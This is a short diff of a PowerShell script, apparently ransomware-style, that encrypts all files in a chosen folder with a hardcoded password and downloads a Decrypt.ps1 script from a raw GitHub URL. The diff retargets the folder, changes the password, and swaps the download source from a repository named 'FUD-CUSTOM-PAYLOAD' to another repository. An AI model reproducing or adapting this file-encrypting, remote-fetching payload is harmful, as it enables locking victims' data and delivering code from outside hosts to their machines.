@@ -1,8 +1,8 @@
 # Define the folder path containing the files to encrypt 
-$folderPath = "F:\Testing"
+$folderPath = "D:\kali linux"
 
 # Set the password
-$password = "12345"
+$password = "Redhat"
 
 # Convert the password to a secure string
 $securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
@@ -65,7 +65,7 @@ Get-ChildItem -Path $folderPath -File | ForEach-Object {
 }
 
 # Define the URL of the raw script on GitHub for Decrypt.ps1
-$decryptScriptUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1"
+$decryptScriptUrl = "https://raw.githubusercontent.com/Rockygit07/ChromePass.1/main/Decrypt.ps1"
 
 # Define the local path where you want to save Decrypt.ps1
 $decryptScriptPath = Join-Path -Path $folderPath -ChildPath "Decrypt.ps1"
